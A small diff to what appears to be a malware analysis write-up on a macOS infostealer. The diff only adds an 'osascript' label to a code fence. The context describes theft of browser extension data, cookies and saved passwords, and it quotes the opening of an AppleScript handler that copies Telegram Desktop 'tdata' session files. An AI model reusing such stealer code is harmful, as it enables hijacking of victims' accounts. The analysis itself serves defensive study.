@@ -766,7 +766,7 @@ bnfooenhhgcnhdkdjelgmmkpaemlnoek - Auto 2FA
 The malware will copy the data from these extensions, including IndexedDB, Local Extension Settings, cookies, and saved passwords.
 
 There is functionality to exfiltrate Telegram data:
-```
+```osascript
 on Telegram(writemind, library)
     try
         GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
